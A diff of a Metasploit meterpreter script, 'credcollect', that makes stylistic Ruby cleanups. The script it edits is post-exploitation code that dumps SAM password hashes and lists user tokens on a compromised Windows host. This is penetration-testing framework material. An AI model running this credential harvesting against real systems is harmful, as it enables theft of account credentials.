@@ -1,20 +1,20 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
 # credcollect - tebo[at]attackresearch.com
 
 opts = Rex::Parser::Arguments.new(
-  "-h" => [ false,"Help menu." ],
-  "-p" => [ true,"The SMB port used to associate credentials."]
+  "-h" => [ false, "Help menu." ],
+  "-p" => [ true, "The SMB port used to associate credentials."]
 )
 
 smb_port = 445
 
-opts.parse(args) { |opt, idx, val|
+opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     print_line("CredCollect -- harvest credentials found on the host and store them in the database")
@@ -24,20 +24,19 @@ opts.parse(args) { |opt, idx, val|
   when "-p" # This ought to read from the exploit's datastore.
     smb_port = val.to_i
   end
-}
+end
 
 if client.platform =~ /win32|win64/
   # Collect even without a database to store them.
-  if client.framework.db.active
-    db_ok = true
-  else
-    db_ok = false
-  end
-
+  db_ok = if client.framework.db.active
+            true
+          else
+            false
+          end
 
   # Make sure we're rockin Priv and Incognito
-  client.core.use("priv") if not client.respond_to?("priv")
-  client.core.use("incognito") if not client.respond_to?("incognito")
+  client.core.use("priv") unless client.respond_to?("priv")
+  client.core.use("incognito") unless client.respond_to?("incognito")
 
   # It wasn't me mom! Stinko did it!
   hashes = client.priv.sam_hashes
@@ -64,7 +63,7 @@ if client.platform =~ /win32|win64/
 
   # Record user tokens
   tokens = client.incognito.incognito_list_tokens(0)
-  raise Rex::Script::Completed if not tokens
+  raise Rex::Script::Completed unless tokens
 
   # Meh, tokens come to us as a formatted string
   print_good "Collecting tokens..."
